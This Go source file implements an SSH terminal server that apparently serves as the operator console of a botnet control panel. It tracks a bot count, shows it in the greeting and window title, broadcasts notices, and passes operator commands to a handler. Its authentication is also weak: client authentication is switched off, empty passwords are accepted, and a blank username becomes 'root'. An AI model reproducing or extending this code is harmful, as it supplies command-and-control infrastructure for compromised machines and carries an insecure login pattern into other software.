package terminal

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io"
	"net"
	"os"
	"sync"

	"agentv2/pkg/commands"
	"agentv2/pkg/config"
	"agentv2/pkg/master"

	"golang.org/x/crypto/ssh"
)

type SshServer struct {
	cfgMgr     *config.ConfigManager
	botMgr     *master.BotManager
	cmdHandler *commands.CommandHandler
	sshConfig  *ssh.ServerConfig
	listener   net.Listener
	sessionsMu sync.RWMutex
	sessions   map[ssh.Channel]string // channel -> username
}

func NewSshServer(cfgMgr *config.ConfigManager, botMgr *master.BotManager, cmdHandler *commands.CommandHandler) (*SshServer, error) {
	server := &SshServer{
		cfgMgr:     cfgMgr,
		botMgr:     botMgr,
		cmdHandler: cmdHandler,
		sessions:   make(map[ssh.Channel]string),
	}

	sshConfig := &ssh.ServerConfig{
		PasswordCallback: func(conn ssh.ConnMetadata, password []byte) (*ssh.Permissions, error) {
			u, ok := cfgMgr.FindUser(conn.User())
			if !ok {
				fmt.Printf("[-] Failed SSH authentication for user: %s (not found)\n", conn.User())
				return nil, fmt.Errorf("user not found")
			}

			if u.Password == "" || u.Password == string(password) {
				fmt.Printf("[+] Authenticated SSH user: %s\n", conn.User())
				return &ssh.Permissions{
					Extensions: map[string]string{
						"user": conn.User(),
					},
				}, nil
			}

			fmt.Printf("[-] Failed SSH password authentication for user: %s\n", conn.User())
			return nil, fmt.Errorf("invalid password")
		},
		NoClientAuth: true,
	}

	// Host key RSA
	rsaSigner, err := getOrGenerateKey("hostkey_rsa.pem", generateRsaKey)
	if err != nil {
		return nil, fmt.Errorf("failed to setup RSA host key: %w", err)
	}
	sshConfig.AddHostKey(rsaSigner)

	// Host key ECDSA
	ecdsaSigner, err := getOrGenerateKey("hostkey_ecdsa.pem", generateEcdsaKey)
	if err != nil {
		return nil, fmt.Errorf("failed to setup ECDSA host key: %w", err)
	}
	sshConfig.AddHostKey(ecdsaSigner)

	server.sshConfig = sshConfig
	return server, nil
}

func (s *SshServer) StartInternal() (int, error) {
	// Listen on 127.0.0.1:0 for multiplexer forwarding
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return 0, err
	}
	s.listener = l
	port := l.Addr().(*net.TCPAddr).Port

	go s.serve()
	return port, nil
}

func (s *SshServer) Close() error {
	if s.listener != nil {
		return s.listener.Close()
	}
	return nil
}

func (s *SshServer) serve() {
	for {
		conn, err := s.listener.Accept()
		if err != nil {
			return
		}
		go s.handleConn(conn)
	}
}

func (s *SshServer) handleConn(netConn net.Conn) {
	sshConn, chans, reqs, err := ssh.NewServerConn(netConn, s.sshConfig)
	if err != nil {
		_ = netConn.Close()
		return
	}
	defer func() {
		_ = sshConn.Close()
	}()

	go ssh.DiscardRequests(reqs)

	username := sshConn.User()
	if username == "" {
		username = "root"
	}

	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			_ = newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
			continue
		}

		channel, requests, err := newChannel.Accept()
		if err != nil {
			continue
		}

		s.sessionsMu.Lock()
		s.sessions[channel] = username
		s.sessionsMu.Unlock()

		go s.handleSession(channel, requests, username)
	}
}

func (s *SshServer) handleSession(channel ssh.Channel, requests <-chan *ssh.Request, username string) {
	defer func() {
		s.sessionsMu.Lock()
		delete(s.sessions, channel)
		s.sessionsMu.Unlock()
		_ = channel.Close()
	}()

	go func() {
		for req := range requests {
			switch req.Type {
			case "shell", "pty-req":
				_ = req.Reply(true, nil)
			case "env":
				_ = req.Reply(true, nil)
			default:
				_ = req.Reply(false, nil)
			}
		}
	}()

	// Send initial clear screen + prompt
	initData := InitialGreeting(username, s.botMgr.GetBotCount())
	_, _ = channel.Write(initData)

	state := NewLineEditorState()
	buf := make([]byte, 1024)

	for {
		n, err := channel.Read(buf)
		if err != nil {
			if err != io.EOF {
				// connection dropped
			}
			break
		}

		shouldClose := state.ProcessInput(buf[:n], channel, username, s.botMgr.GetBotCount(), func(cmd string) (string, bool, bool) {
			return s.cmdHandler.Handle(username, cmd)
		})

		if shouldClose {
			break
		}
	}
}

func (s *SshServer) BroadcastNotice(msg string) {
	s.sessionsMu.RLock()
	defer s.sessionsMu.RUnlock()

	payload := []byte(fmt.Sprintf("\r\n  %s──%s  %s%s%s\r\n", commands.CDim, commands.C0, commands.CWarn, msg, commands.C0))
	for ch := range s.sessions {
		_, _ = ch.Write(payload)
	}
}

func (s *SshServer) UpdateBotCountTitle(count int64) {
	s.sessionsMu.RLock()
	defer s.sessionsMu.RUnlock()

	titleBytes := []byte(fmt.Sprintf("\x1b]0;Connected %d\x07", count))
	for ch := range s.sessions {
		_, _ = ch.Write(titleBytes)
	}
}

func getOrGenerateKey(fileName string, generator func() ([]byte, error)) (ssh.Signer, error) {
	data, err := os.ReadFile(fileName)
	if err == nil {
		return ssh.ParsePrivateKey(data)
	}

	pemBytes, err := generator()
	if err != nil {
		return nil, err
	}

	_ = os.WriteFile(fileName, pemBytes, 0600)
	return ssh.ParsePrivateKey(pemBytes)
}

func generateRsaKey() ([]byte, error) {
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}
	keyBytes := x509.MarshalPKCS1PrivateKey(key)
	pemBlock := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: keyBytes,
	}
	return pem.EncodeToMemory(pemBlock), nil
}

func generateEcdsaKey() ([]byte, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, err
	}
	keyBytes, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		return nil, err
	}
	pemBlock := &pem.Block{
		Type:  "EC PRIVATE KEY",
		Bytes: keyBytes,
	}
	return pem.EncodeToMemory(pemBlock), nil
}
